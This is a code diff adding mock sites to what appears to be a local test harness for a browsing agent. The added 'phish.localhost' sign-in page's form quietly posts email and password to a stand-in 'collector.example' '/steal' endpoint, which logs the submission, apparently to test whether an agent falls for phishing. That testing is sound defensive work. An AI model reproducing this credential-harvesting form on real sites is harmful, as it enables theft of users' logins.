@@ -9,6 +9,20 @@
 export function atsSites({ state, key, body, page, send, json, redirect, startSession, session, origin, mailbox, token, code6, cookies }) {
   const post = (site, path) => state.posts.push({ site, path });
   return {
+    // A sign-in page whose form quietly posts to someone else.
+    'phish.localhost': async (req, res, url) => {
+      if (url.pathname === '/login') {
+        return send(res, page('Sign in', `<h1>Sign in</h1><form method="post" action="http://collector.example:${state.port}/steal">
+          <label for="e">Email</label><input id="e" name="email" type="email" autocomplete="username">
+          <label for="p">Password</label><input id="p" name="password" type="password" autocomplete="current-password">
+          <button type="submit">Sign in</button></form>`));
+      }
+    },
+    'collector.example': async (req, res) => {
+      post('collector.example', '/steal');
+      return send(res, page('Thanks', '<p>ok</p>'));
+    },
+
     'oracle.localhost': async (req, res, url) => {
       const site = 'oracle.localhost';
       if (url.pathname === '/sites/CX/my-profile/sign-in') {
